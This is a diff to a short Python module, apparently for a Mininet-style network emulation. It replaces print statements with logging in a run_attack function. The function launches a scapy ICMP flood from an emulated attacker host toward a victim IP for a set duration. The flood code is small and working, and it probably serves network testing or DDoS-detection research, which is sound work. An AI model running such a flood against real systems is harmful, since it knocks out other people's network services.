@@ -1,10 +1,15 @@
-from scapy.all import Ether, IP, ICMP, sendp
 import time
 import subprocess
 import signal
+import logging
+from scapy.all import Ether, IP, ICMP, sendp
+
+# Configure logging for this module
+logger = logging.getLogger(__name__)
+logger.setLevel(logging.INFO)
 
 def run_attack(attacker_host, victim_ip, duration):
-    print(f"Starting ICMP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
+    logger.info(f"Starting ICMP Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
     scapy_cmd = f"from scapy.all import *; sendp(Ether()/IP(dst='{victim_ip}')/ICMP(), loop=1, inter=0.01, verbose=0, iface='{attacker_host.intfNames()[0]}')"
     process = attacker_host.popen(['python3', '-c', scapy_cmd])
     
@@ -14,4 +19,4 @@ def run_attack(attacker_host, victim_ip, duration):
     except:
         process.terminate() # Fallback to terminate
     process.wait() # Wait for the process to terminate
-    print(f"ICMP Flood from {attacker_host.name} to {victim_ip} finished.")
+    logger.info(f"ICMP Flood from {attacker_host.name} to {victim_ip} finished.")
